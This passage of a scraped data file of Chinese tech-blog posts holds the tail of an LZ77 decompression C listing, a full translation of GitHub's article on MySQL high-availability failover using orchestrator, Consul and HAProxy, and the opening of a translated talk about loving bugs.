class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">next</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-316\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*调整剩余数量*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-317\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">remaining</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-318\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-319\"><span class=\"crayon-h\">            </span><span class=\"crayon-c\">/*设置短语长度为1*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-320\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">length</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-321\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-322\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">/*复制前向缓冲中的数据到滑动窗口*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-323\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">LZ7_WINDOW_BITS</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-324\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">memmove</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">window</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">LZ77_WINDOW_SIZE</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-v\">buffer</span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">length</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-325\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-326\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*指向原始数据缓冲区*/</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-327\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">original</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orig</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-328\"> </div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-329\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/*返回解压缩的原始数据中的字节数*/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623045dbd1b466646927-330\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\">  </span><span class=\"crayon-v\">opos</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b623045dbd1b466646927-331\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0395 seconds] -->\r\n<p></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114214\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114214votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114214\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/8c38398f296a7779190d5d6669e90e1476ae113d.jpg"},{"url_object_id": "b88c57937f3bff3e9546fbbb3ad0988e", "title": ["GitHub 的 MySQL 高可用性实践分享"], "url": "http://blog.jobbole.com/114200/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "praise_nums": "2", "comment_nums": 0, "fav_nums": 2, "tags": "IT技术, MySQL, 高可用", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://githubengineering.com/mysql-high-availability-at-github/\">shlomi-noach </a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/mysql-high-availability-at-github?print\">oschina</a>   </div><div>\n<p>GitHub 使用 MySQL 作为所有非 git 仓库数据的主要存储, 它的可用性对 GitHub 的访问操作至关重要。GitHub 站点本身、GitHub 的 API、身份验证等等都需要进行数据库访问。我们运行着多个 MySQL 集群来为不同的服务和任务提供支持。我们的集群使用经典的主从配置, 主集群中的某个节点能够接受写入。其余的从集群节点异步同步来自主服务器的更改, 并提供数据的读取服务。</p>\n<p>主节点的可用性尤为重要。没有主服务器, 集群无法接受写入：任何需要保留的写入数据都不能持久化保存，任何传入的更改（如提交、问题、用户创建、审阅、新存储库等）都将失败。</p>\n<p>为了支持写操作，我们显然需要有一个可用的数据写入节点，一个主集群。但同样重要的是，我们需要能够识别或找到该节点。</p>\n<p>在一个写入失败，提示说主节点崩溃的场景中，我们必须确保能启用一个新的主节点，并快速表明其身份。检测故障所需的时间、进行故障转移并公布新的主节点所花费的时间，构成了总的停机时间。</p>\n<p>本文将介绍 GitHub 的 MySQL 高可用性和主服务发现解决方案，它使我们能够可靠地运行跨数据中心操作，容忍数据中心隔离，并使得出现故障时耗费的停机时间变得更短。</p>\n<h2>高可用目标</h2>\n<p>本文描述的解决方案，迭代并改进了之前在 GitHub 实现的高可用(HA)解决方案。随着规模的扩大，MySQL 的高可用策略必须适应变化。我们希望为 GitHub 中的 MySQL 和其他服务，提供类似的高可用策略。</p>\n<p>在考虑高可用和服务发现时，有些问题可以引导你找到合适的解决方案。包含但不限于：</p>\n<ul>\n<li>你能容忍多长的中断时间？</li>\n<li>崩溃检测的可靠性如何？你能容忍错误报告（过早的故障转移）吗？</li>\n<li>故障转移的可靠性如何？什么情况下可以失败？</li>\n<li>解决方案在跨数据中心的场景下效果如何？在低延迟和高延迟的网络情况下如何？</li>\n<li>解决方案是否允许一个完整的数据中心故障或者出现网络隔离？</li>\n<li>有没有防止或缓解脑裂（两台服务器都宣称是某个集群的主节点，不知情对方的存在，并且都能接受写操作）的机制。</li>\n<li>你能允许数据丢失吗？在多大程度上？</li>\n</ul>\n<p>为了说明上面的一些情况，首先让我们讨论一下之前的高可用方案，并说说我们为什么要修改它。</p>\n<h2>移除基于 VIP 和 DNS 的服务发现</h2>\n<p>在之前的迭代版本中，我们：</p>\n<ul>\n<li>使用 <a href=\"https://githubengineering.com/orchestrator-github/\" rel=\"nofollow\">orchestrator</a> 来做检测和故障转移</li>\n<li>使用 VIP 和 DNS 做主节点的发现</li>\n</ul>\n<p>在这个迭代版本中，客户端使用名字服务（比如 mysql-writer-1.github.net）来发现写节点。名字可以解析为一个虚拟 IP(VIP)，这个 VIP 指向主节点。</p>\n<p>因此，在正常情况下，客户端只需要解析名称，连接到解析后的 IP上，然后发现主节点也正在另一边监听链接（也就是客户端连上了主节点）。</p>\n<p>考虑这个跨越三个不同数据中心的复制拓扑：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/e752113fd43657ff8cf09024a4f5d777.png\" alt=\"\"></p>\n<p>当主节点发生故障时，必须在副本集中选出一个服务器，提升为新的主节点。</p>\n<p>orchestrator 将会检测到故障，选举出一个新的主节点，然后重新分配 name（名称）和 VIP（虚拟 IP）。客户端实际上并不知道主节点的真实身份：它们只知道 name（名字），而这个名字现在必须解析给新的主节点。不过，需要考虑：</p>\n<p>VIP 是需要协作的：它们由数据库服务器自己声明和拥有。为了获得或释放 VIP，服务器必须发送 ARP 请求。拥有 VIP 的服务器必须在新提升的主节点获得 VIP 之前先释放掉。这还有一些额外的影响：</p>\n<ul>\n<li>有秩序的故障转移操作会首先通知故障主节点并要求它释放 VIP，然后再通知新提升的主节点并要求它获取 VIP。如果无法通知到原主节点或者拒绝释放 VIP 怎么办？首先要考虑到，该服务器上存在故障场景，它不可能会不及时响应，或根本不响应。\n<ul>\n<li>我们最终可能会出现脑裂情况：两个注解同时声称拥有同一个 VIP。根据最短的网络路径，不同的客户端可能会连接到不同的服务器。</li>\n<li>事实源于两个独立服务器间的协作，并且这个设置是不可靠的。</li>\n</ul>\n</li>\n<li>即使原主节点确实配合，工作流程也浪费了宝贵的时间：当我们通知原主节点时，切换到新主节点的操作一直在等待。</li>\n<li>即使 VIP 发生变化，现有的客户端连接也不能保证与原服务器断开连接，而且我们可能仍然会经历脑裂。</li>\n</ul>\n<p>VIP 受限于物理位置。它们属于交换机或者路由器。所以，我们只能将 VIP 重新分配到位于同一位置的服务器上。特别是，当新提升的服务器位于不同的数据中心时，我们无法分配 VIP，只能修改 DNS。</p>\n<ul>\n<li>修改 DNS 需要较长的传播时间。根据配置，客户端会缓存 DNS 一段时间。跨数据中心(cross-DC)故障转移则意味着更多的中断时间：为了让所有客户端知晓新主节点的身份，需要花费更长的时间。</li>\n</ul>\n<p>仅这些限制，就足以促使我们寻求新的解决方案，但考虑更多的是：</p>\n<ul>\n<li>主节点通过 pt-heartbeat 心跳服务进行自行注入，目的是<a href=\"https://githubengineering.com/mitigating-replication-lag-and-reducing-read-load-with-freno/\" target=\"_blank\" rel=\"nofollow\">测量延迟和节流</a>。这项服务必须从新提升的主节点开始。如果有可能的话，原主节点的服务将被关闭。</li>\n<li>同样的，<a href=\"https://github.com/github/orchestrator/blob/master/docs/pseudo-gtid.md\" rel=\"nofollow\">Pseudo-GTID</a> 注入也是主节点自己管理的。它将从新的主节点开始，并在原主节点结束。</li>\n<li>新的主节点被设为可写。如果可能的话，原主节点被设为只读。</li>\n</ul>\n<p>这些额外的步骤是导致中断总时间的一个因素，并且引入了它们自己的故障和摩擦。</p>\n<p>该解决方案生效了，GitHub 已经成功完成 MySQL 的故障迁移，但我们希望我们的 HA 在以下方面有所改进：</p>\n<ul>\n<li>数据中心不可知</li>\n<li>允许数据中心出现故障</li>\n<li>删除不可靠的协作工作流</li>\n<li>减少总的中断时间</li>\n<li>尽可能地进行无损故障转移</li>\n</ul>\n<h2>GitHub 的高可用解决方案：orchestrator, Consul, GLB</h2>\n<p>我们的新策略，除了附带的改进外，还解决或减轻了上面的许多问题。在今天的高可用设置中，我们有：</p>\n<ul>\n<li>使用 <a href=\"https://github.com/github/orchestrator\" target=\"_blank\" rel=\"nofollow\">orchestrator</a> 来做监测和故障转移。我们使用跨数据中心的 <a href=\"https://github.com/github/orchestrator/blob/master/docs/raft.md\" rel=\"nofollow\">orchestrator/raft</a> 方案，如下图。</li>\n<li>使用 Hashicorp 的 <a href=\"https://www.consul.io/\" rel=\"nofollow\">Consul</a> 来做服务发现。</li>\n<li>使用 <a href=\"https://githubengineering.com/introducing-glb/\" target=\"_blank\" rel=\"nofollow\">GLB/HAProxy</a> 作为客户端和写节点的代理层。</li>\n<li>使用选播(anycast)做网络路由。</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d28cf7c2b62e1601cd4f817cbf54740.png\" alt=\"\"></p>\n<p>新的设置将完全删除 VIP 和 DNS 的修改。在我们引入更多组件的同时，我们能够将组件解耦并简化任务，并且能够使用可靠、稳定的解决方案。下面逐一分析。</p>\n<h3>正常流程</h3>\n<p>正常情况下，应用程序通过 GLB/HAProxy 连接到写节点。</p>\n<p>应用程序永远不知道主节点的身份。和之前一样，它们使用名字。例如，cluster1 的主节点命名为 mysql-writer-1.github.net。在我们当前的设置中，名字被解析为一个选播(<a href=\"https://en.wikipedia.org/wiki/Anycast\" target=\"_blank\" rel=\"nofollow\">anycast</a>) IP。</p>\n<p>使用选播时，名字在任何地方都被解析为相同的 IP，但流量会根据客户端位置的不同进行路由。需要指出的是，在我们的每个数据中心，都有 GLB（我们的高可用负载均衡）被部署在不同的容器中。指向 mysql-writer-1.github.net 的流量总是路由到本地数据中心的 GLB 集群。因此，所有客户端都由本地代理提供服务。</p>\n<p>我们在 <a href=\"https://www.haproxy.com/\" rel=\"nofollow\">HAProxy</a> 上运行 GLB。我们的 HAProxy 维护了一个写连接池：每个 MySQL 集群一个连接池，其中每个连接池只有一个后端服务器：集群的主节点。DC 中的所有 GLB/HAProxy 容器都具有相同的连接池，并且它们都指向相同的后端服务器。这样，如果一个应用程序想要写入 mysql-writer-1.github.net，它连接到哪个 GLB 服务器并不重要。它总会被路由到实际的 cluster1 主节点上。</p>\n<p>对于应用程序而言，服务发现结束于 GLB，并且不再需要重新发现。就这样，通过 GLB 将流量路由到正确地址。</p>\n<p>GLB 如何知道哪些服务器可以作为后端服务器，以及如何将更改传播到 GBL 呢？</p>\n<h3><strong>Consul 的服务发现</strong></h3>\n<p>Consul 是著名的服务发现解决方案，它也提供 DNS 服务。然而，在我们的解决方案中，我们用它作为高效的键值存储系统。</p>\n<p>在 Consul 的键值存储中，我们写入了集群主控的标识。对于每一个集群，都有一个键值对记录标识集群的主 FQDN，端口，IPV4，IPV6。</p>\n<p>每一个 GLB/HAProxy 节点都运行 consul 模板：每一个服务都在监听 consul 数据的变更（这里主要是对集群主控的数据变更）。consul 模板会生成一个有效的配置文件并且当配置变更时，能够自动重载 HAProxy。</p>\n<p>因此，Consul 中主控标识的变更会被每一个 GLB/HAProxy 观察到，然后它们立即重新配置它们自己，在集群后端池中设置新的主控作为单一对象，并且进行重载以反映这些变更。</p>\n<p>在 GitHub 中，每一个数据中心都有一个 Consul 设置，并且每一个设置都具有高可用性。然而，这些设置又互相独立，它们之间不进行互相复制或数据共享。</p>\n<p>那么 Consul 是如何获得变更通知，在交叉数据中心中，信息又是如何分布的呢？</p>\n<h3>orchestrator/raft</h3>\n<p>运行一个 orchestrator/raft 设置：orchestrator 节点之间通过 raft 一致性算法进行通信。每一个数据中心有 1~2 个 orchestrator 节点。</p>\n<p>orchestrator 负责失败检测，MySQL 故障转移，以及 Consul 主控的变更通知。故障转移通过单个 orchestrator/raft 主导节点进行操作，但是对于主控变更，产生新主控的消息会通过 raft 机制被传播到所有 orchestrator 节点。</p>\n<p>一旦 orchestrator 节点接收到主控变更的消息，它们会与自己对应的本地 Consul 设置通信：它们都执行 KV 写操作。具有多个 orchestrator 节点的数据中心会有多个完全相同的 Consul 写操作。</p>\n<h3>整体流程</h3>\n<p>在主节点故障的场景中：</p>\n<ul>\n<li>orchestrator 节点检测到故障。</li>\n<li>orchestrator/raft 主导节点开始恢复。一个新的主节点被设置为 promoted 状态。</li>\n<li>orchestrator/raft 向所有 raft 集群节点通知主节点变更。</li>\n<li>所有 orchestrator/raft 成员接收到主节点变更的通知。每个成员都向本地 Consul 写入包含新主节点身份的 KV 记录。</li>\n<li>每个 GLB/HAProxy 都运行一个 consul 模版，用于监视 Consul KV 存储的变化，并重新配置和重新加载 HAProxy。</li>\n<li>客户端流量被重定向到新的主节点上。</li>\n</ul>\n<p>每个组件都有明确的责任归属，而且整个设计简单并且解耦。orchestrator 不需要知道负载均衡。Consul 不需要知道这些信息是从哪里来的。代理只关心 Consul，客户端只关心代理。</p>\n<p>而且：</p>\n<ul>\n<li>没有 DNS 的变更需要传播。</li>\n<li>没有 TTL。</li>\n<li>整个流程不需要原故障主节点的配合，它在很大程度上已被忽略。</li>\n</ul>\n<h3>其他细节</h3>\n<p>为了进一步确保流程的安全，我们还提供了以下内容：</p>\n<ul>\n<li>将 HAProxy 的配置项 hard-stop-after 设置为一个非常短的时间。当在写连接池中使用新的后端服务器重新加载时，它会自动终止所有到原主节点的连接。\n<ul>\n<li>通过使用 hard-stop-after 配置项，我们甚至不需要客户端的配合，这也就缓解了脑裂的情况。值得注意的是，这并不是绝对的，我们还是需要一些时间来消灭旧连接。但是，在某个时间点之后，我们就会感到舒服，因为不会出现令人厌恶的意外。</li>\n</ul>\n</li>\n<li>我们并不严格要求 Consul 随时可用。实际上，我们只需要它在故障转移期间可用。如果 Consul 恰好这时不可用，GLB 将继续使用已知的信息运作，不采用任何极端的行动。</li>\n<li>GLB 被用于验证新提升的主节点的身份。类似于我们的 <a href=\"https://githubengineering.com/context-aware-mysql-pools-via-haproxy/\" target=\"_blank\" rel=\"nofollow\">context-aware MySQL pools</a>（上下文感知的 MySQL 线程池），在后端服务器上进行检查，以确保它确实是一个可写的节点。如果我们恰好在 Consul 中删除了主节点的身份，没有问题；空的条目会被忽略。如果我们在 Consul 中错误的写入了一个非主节点的名称，没有问题；GLB 将拒绝更新它并以最后已知的状态继续运行。</li>\n</ul>\n<p>我们会在以下章节进一步完成备受关注和期望的高可用目标。</p>\n<h1>orchestrator/raft 失败检测</h1>\n<p>orchestrator使用<a href=\"https://github.com/github/orchestrator/blob/master/docs/failure-detection.md\" target=\"_blank\" rel=\"nofollow\">全面方法</a>来检测失败，因此这种方法非常可靠。我们不会观察到误报 —— 因为我们没有进行过早的故障转移，所以也不会产生不必要的中断时间。</p>\n<p>通过完全的 DC 网络隔离（又称 DC 栅栏），orchestrator/raft 进一步处理这个问题。一个 DC 网络隔离会引起一些混淆：这个 DC 中的服务器是可以互相通信的。他们是与其他 DC 网络隔离，还是其他 DC 被网络隔离？</p>\n<p>在一个 orchestrator/raft 设置中，raft 的 leader 节点就是运行故障转移的那个节点。leader 是取得了大多数节点支持的节点（特定数量）。我们的 orchestrator 节点部署就是这样，没有单一数据中心可以占大多数，任何 n-1 的 DC 也是如此。</p>\n<p>在一个完全 DC 网络隔离的事件中，这个 DC 的 orchestrator 节点与其它 DC 中的对应节点失去连接。最终，隔离 DC 中的 orchestrator 节点不能作为 raft 集群的 leader 节点。如果任何这种节点碰巧成为了 leader 节点，它就会退出。一个新的 leader 节点可以从任何一个其他 DC 分配。leader 节点会得到其他所有 DC 的支持，这些 DC 彼此之间可以进行通信。</p>\n<p>因此，调用 shots 的 orchestrator 节点将位于网络隔离数据中心之外。一个隔离 DC 应该有一个主服务器，orchestrator 会使用可用 DC 中的其中一个服务器将它替换来初始化故障转移。我们委托非隔离 DC 中的那些节点来做这个决定，以此来缓解 DC 隔离。</p>\n<h1>更快的公告</h1>\n<p>通过发出公告说主分支即将修改，可以进一步减少运行停机的总时间。如何实现这个想法？</p>\n<p>当 orchestrator 开始进行故障迁移的时候，它会观察可用于升级的服务器队列。在了解自我复制的规则，以及接受提示和限制的情况下，在最好的行动方针中，它能做出基于一定训练的决策。</p>\n<p>它可能意识到一个可以升级的服务器也是一个理想的候选策略，例如：</p>\n<ul>\n<li>没有什么可以阻止服务器的升级（潜在用户已经暗示服务器优先升级），而且</li>\n<li>认为服务器可以将它所有的版本视为复本。</li>\n</ul>\n<p>在这个例子中 orchestrator 首先将服务器设置为可写，然后立即公告服务器的升级（我们的例子中是写到了 Consul KV），即使异步开始修复复制树，这种操作通畅会花费更多几秒的运算。</p>\n<p>有可能当我们的 GLB 服务器完全重载时，复制树已经完好无损，但是这不是严格要求的。服务器可以接收到写操作！</p>\n<h2>半同步复制</h2>\n<p>在 MySQL 的<a href=\"https://dev.mysql.com/doc/refman/en/replication-semisync.html\" target=\"_blank\" rel=\"nofollow\">半同步复制</a>中，在获知更改已发送到一个或多个副本之前，主服务器不会确认事务已提交。它提供了一种实现无损故障转移的方法：应用于主服务器的任何更改都将应用于或等待应用于其中一个副本。</p>\n<p>一致性带来的成本是：可用性风险。如果没有副本确认收到更改，主服务器将被阻塞并且写入操作将停止。幸运的是，这里有一个超时设置，在这之后主服务器可以恢复到异步复制模式，使写入操作再次可用。</p>\n<p>我们已经把我们的超时设置在一个合理的低值：500ms。将更改从主服务器发送到本地 DC 副本，通常也发送到远程 DC，这个阈值是绰绰有余的。设置这个超时时间之后，我们可以观察到完美的半同步行为（无需回退到异步复制），并且在确认失败的情况下，可以在非常短的阻塞周期内获得让人满意的表现。</p>\n<p>我们在本地 DC 副本上启用半同步，并且在主服务器宕机的情况下，我们期望（尽管不严格地执行）无损故障转移。对完整的 DC 故障进行无损故障转移的代价很高昂，我们并不期待这么做。</p>\n<p>在试验半同步超时的同时，我们还观察到一种对我们有利的行为：主服务器在发生故障时，我们能够影响最佳候选人的标识。通过在指定的服务器上启用半同步，并将它们标记为候选服务器，我们可以通过影响故障的结果来减少总的停机时间。在我们的<a href=\"https://githubengineering.com/mysql-testing-automation-at-github/\" target=\"_blank\" rel=\"nofollow\">试验</a>中，我们观察到，我们通常最终会得到最佳候选服务器，并因此发布快速公告。</p>\n<h2>心跳注入</h2>\n<p>我们没有在已提升/已降级的主设备上管理 pt-heartbeat 服务的启动/关闭，作为替代，我们选择随时随地运行它。这需要进行打一些<a href=\"https://github.com/percona/percona-toolkit/pull/302/files?w=1\" rel=\"nofollow\">补丁</a>，以便使 pt-heartbeat 可以支持服务器端来回更改它们的 read_only 状态或其完全崩溃。</p>\n<p>在我们目前的设置中，在主服务器及其副本上运行 pt-heartbeat 服务。在主服务器上，他们产生心跳事件。在副本服务器上，他们识别到服务器是只读的，并定期重新检查其状态。只要服务器升级为主服务器，该服务器上的 pt-heartbeat 会将服务器标识为可写，并开始注入心跳事件。</p>\n<h2>orchestrator 所有权委托</h2>\n<p>我们进一步委托到 orchestrator：</p>\n<ul>\n<li>伪-GTID注入</li>\n<li>设置被提升的主控作为可写的，清除它的复写状态</li>\n<li>如果可能，设置老的主控为只读状态</li>\n</ul>\n<p>对于新主控，以上所有这些操作减少了冲突的可能性。一个刚刚被提升的主控应该是在线的并且可接入，否则我们就不应该提升它。然后让 orchestrator 直接应用变更到被晋升的主控上也应该是合理的。</p>\n<h2>限制和缺点</h2>\n<p>代理层使得应用程序不知道主服务器的身份，但是对于主服务器它也掩盖了应用程序的身份。所有主服务器看到的连接都来自代理层，我们丢失了关于连接实际来源的信息。</p>\n<p>随着分布式系统的发展，我们仍然遗留了未处理的场景。</p>\n<p>值得注意的是，在数据中心隔离场景中，假设主服务器位于 DC 中，DC 中的应用程序仍然能写入主服务器。一旦网络恢复正常，可能会导致状态不一致。我们正努力在非常独立的 DC 中，通过实现一个可靠的 <a href=\"https://en.wikipedia.org/wiki/STONITH\" target=\"_blank\" rel=\"nofollow\">STONITH</a> 来缓解这种脑裂。和以前一样，在将主服务器之前需要花费一些时间，可能出现短暂的脑裂。而避免脑裂的操作成本非常高。</p>\n<p>更多的场景存在：故障转移时 Consul 的终端；部分 DC 隔离；其他的。我们知道，使用这种性质的分布式系统不可能消除所有的漏洞，因此，我们将焦点放在最重要的案例上。</p>\n<h2>结果</h2>\n<p>orchestrator/GLB/Consul 设置给我们提供以下功能：</p>\n<ul>\n<li>可靠的故障检测</li>\n<li>数据中心不可知的故障迁移</li>\n<li>典型的无损故障迁移</li>\n<li>对数据中心网络隔离的支持</li>\n<li>缓解脑裂的问题（仍在实现中）</li>\n<li>无合作相关的依赖</li>\n<li>多数场景下大约 10~13 秒的断电恢复能力。（我们观察到一些场景下最长 20 秒的断电恢复和极端场景下最长 25 秒的情况）</li>\n</ul>\n<h2>结语</h2>\n<p>编排/代理/服务发现范例在解耦架构中使用众所周知的可信组件，这使得部署、运维和观察变得更加容易，并且每个组件可以独立扩展或缩减。我们将不断测试我们的设置，以继续寻求改进。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114200\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114200votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114200\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/122897caaf5c7d1b1b7bfa67a1ac43c10e67c13a.jpg"},{"url_object_id": "8537a3c72782bba2e6eee3e4d7202046", "title": ["程序员，热爱你的 bug"], "url": "http://blog.jobbole.com/114165/", "create_date": "2018/07/26", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/06/2034139cf13a5d2840500f5a15322217.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "开发, Bug", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/wx232824506\">学以致用123</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://akaptur.com/blog/2017/11/12/love-your-bugs/\">Allison Kaptur</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>2017 年 10 月初，我在贝洛奥里藏特(巴西) 的 Python Brasil 大会做了一个主题演讲。下面是这个演讲的笔记 。 <a href=\"#\">这里</a>可以下载视频。</p>\n<h2>我热爱 bug</h2>\n<p>我现在是 Pilot.com 的高级工程师，为初创公司开发自动记账系统。在这之前，我在 Dropbox 的桌面客户端团队工作，后面我会讲到在那里工作时的一些小故事。在那之前，我是 Recurse Center 的一个推进者，Recurse Center 对于程序员的感觉很像写作者的隐居地。 我在大学学习的是天体物理学，在成为工程师之前在金融机构工作了几年。</p>\n<p>但是这些事情没有一件是重要的—你只需要记住我热爱 bug 就足够了。我热爱 bug 是因为它们非常有趣。它们富有戏剧性。一个大 bug 的查找过程曲折离奇。一个大 bug 很像一个很好的笑话或谜语，你期待一个输出，但结果却大相径庭。</p>\n<p><strong>在这个讲演中，我将会讲述一些我热爱的 bug，解释我为什么如此热爱 bug，然后说服你也应该热爱 bug。</strong></p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1ftn14yvhzkj20m80b4dfx.jpg\" width=\"690\" height=\"345\"></p>\n<h2>第一个 Bug</h2>\n<p>好，直接进入 第一个 Bug。这是我在 Dropbox 遇到的一个 bug 。你可能知道，Dropbox 是个应用程序，可以将文件从一台计算机同步到云端，并同步到其它计算机。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6258da63ffc443996526\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px 